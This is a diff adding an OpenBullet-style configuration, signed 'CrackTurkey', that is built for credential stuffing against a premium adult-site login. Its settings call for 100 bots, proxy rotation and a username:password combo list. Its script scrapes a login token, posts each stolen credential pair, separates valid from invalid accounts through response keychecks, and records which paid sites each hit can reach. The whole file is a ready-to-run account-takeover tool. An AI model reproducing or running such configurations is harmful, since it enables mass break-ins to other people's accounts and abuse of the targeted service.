@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "PornHub",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-07T16:09:32.7225488+03:00",
+  "AdditionalInfo": "Sağlam Proxy Gerektirir",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Combo : UserPass - Proxy ON",
+      "VariableName": "",
+      "Id": 94807257
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey REQUEST GET "https://www.pornhubpremium.com/premium/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "token\" value=\"" "\" />" -> VAR "TOKEN" 
+
+#CrackTurkey REQUEST POST "https://www.pornhubpremium.com/front/authenticate" 
+  CONTENT "username=<USER>&password=<PASS>&redirect=&from=pc_premium_login&segment=straight&token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "message\":\"Invalid username\\/password!" 
+    KEY "Account disabled. Please try again later" 
+  KEYCHAIN Success OR 
+    KEY "premium_redirect_cookie\":\"1" 
+
+#CrackTurkey REQUEST GET "https://www.pornhubpremium.com/postlogin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "{\"data\":\"" "\",\"sid\":\"\"};" -> VAR "PPTOKEN" "" "&network=undefined&domain=undefined&logout=undefined&location=https%3A%2F%2Fwww.pornhubpremium.com%2Fpostlogin" 
+
+#CrackTurkey REQUEST GET "https://ppp.contentdef.com/postlogin?data=<PPTOKEN>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "data-trackid=\"PPBAR-pornhub premium-ContinueToProduct-" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Sites" 
+
+#CrackTurkey KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Sites>" Contains "[]" 
+
